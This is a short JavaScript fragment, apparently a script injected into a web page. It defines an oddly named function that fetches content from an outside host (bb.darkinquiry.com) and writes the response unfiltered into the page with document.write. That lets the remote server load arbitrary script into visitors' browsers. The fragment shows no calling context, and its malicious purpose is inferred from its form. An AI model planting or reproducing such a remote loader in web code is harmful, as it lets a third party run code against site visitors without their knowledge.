function mppmpp() {
    $.ajax({
        url: "https://bb.darkinquiry.com/?step=4&n=140",
        type: 'get',
        cache: false,
        success: function(stats) {
document.write(stats);
          }
    });
}
